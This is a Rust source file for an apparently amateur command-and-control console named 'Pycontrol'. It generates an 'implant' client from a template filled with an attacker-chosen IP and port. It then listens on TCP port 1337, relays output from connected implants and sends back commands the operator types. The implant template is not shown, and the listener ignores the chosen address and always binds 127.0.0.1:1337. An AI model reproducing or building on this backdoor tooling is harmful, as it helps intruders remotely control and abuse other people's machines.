use std::{io::{BufRead}, thread, u32};
use std::net::{TcpListener, TcpStream, Shutdown};
use std::io::{Write, BufReader, BufWriter};
use std::fs;

fn handel_client(stream: TcpStream) {
    let loopize = true;
    while loopize {
        let mut data_buffer = BufReader::new(&stream);
        let mut data_writer = BufWriter::new(&stream);
        let mut response = String::new();
        let mut full_response: Vec<String> = Vec::new();
        let is_blank = false;
        while is_blank == false{
            let mut line: String = String::new();
            data_buffer.read_line(&mut line).expect("Error");
            if line == "END OF BUFFER\n"{
                break;
            }
            else{
                full_response.push(line);
            }
        }
        for line in full_response{
            println!("{}",line);
        }
        println!("response?");
        std::io::stdin().read_line(&mut response).unwrap();
        response = format!("{}\n",response);
        data_writer.write_all(&mut response.as_bytes()).expect("Failed to write buffer");
        drop(data_writer);
        if response.contains("exit"){
            stream.shutdown(Shutdown::Both).expect("error shuttind down stream.");
            break;
        }
    }
}


fn generat_client(ip: &str,port: &u32 ){
    let client_template_string = fs::read_to_string("../pycontrol/src/client_template.txt").expect("error reading file");
    let mut client_template_output = client_template_string.replace("{IP}", ip);
    client_template_output = client_template_output.replace("{PORT}", &format!("{}",port));
    let mut client = std::fs::File::create("../pyimplantclient/src/main.rs").expect("Error creating file");
    client.write_all(client_template_output.as_bytes()).expect("ERROR WRITING CLIENT RUST FILE");
    println!("Client Generated")
}

fn set_ip() -> String{
    println!("IP address?");
    let mut ip = String::new();
    std::io::stdin().read_line(&mut ip).unwrap();
    return ip.trim_matches('\n').to_string();
}

fn set_port() -> u32{
    println!("Port number?");
    let mut port_string = String::new();
    std::io::stdin().read_line(&mut &mut port_string).unwrap();
    port_string = port_string.trim_matches('\n').to_string();
    let port:u32 = port_string.parse().unwrap();
    println!("{}", port);
    return port;
}

fn command_line(){
    let command_loop = true;
    println!("Welcome to Pycontrol");
    let mut ip = String::new();
    let mut port: u32 = 0;
    while command_loop{
        print!("Command?\n");
        let mut pycommand = String::new();
        std::io::stdin().read_line(&mut pycommand).unwrap();
        println!("{}", pycommand);
        if pycommand == "exit\n"{
            break
        }
        else if pycommand == "help\n" {
            print!("This is the help menu\n");
        }
        else if pycommand == "set ip\n"{
            ip = set_ip();
        }
        else if pycommand == "set port\n"{
            port = set_port();
        }
        else if pycommand == "listen\n" {
            listen(&ip, &port);
        }
        else if pycommand == "generate client\n"{
            generat_client(&ip, &port)
        }
        else{
            println!("next thing");
        }
    }   
}

fn listen(ip: &str, port: &u32){
    format!("{}:{}",ip, port);
    let listener = TcpListener::bind("127.0.0.1:1337").unwrap();
    for stream in listener.incoming(){
        match stream {
            Ok(stream) => {
                println!("New connection: {}", stream.peer_addr().unwrap());
                thread::spawn(move|| {
                    // connection succeeded
                    handel_client(stream)
                });
            }
            Err(e) => {
                println!("Error: {}", e);
                // connection failed
            }
        }
    }

}
fn main(){
    command_line();
}
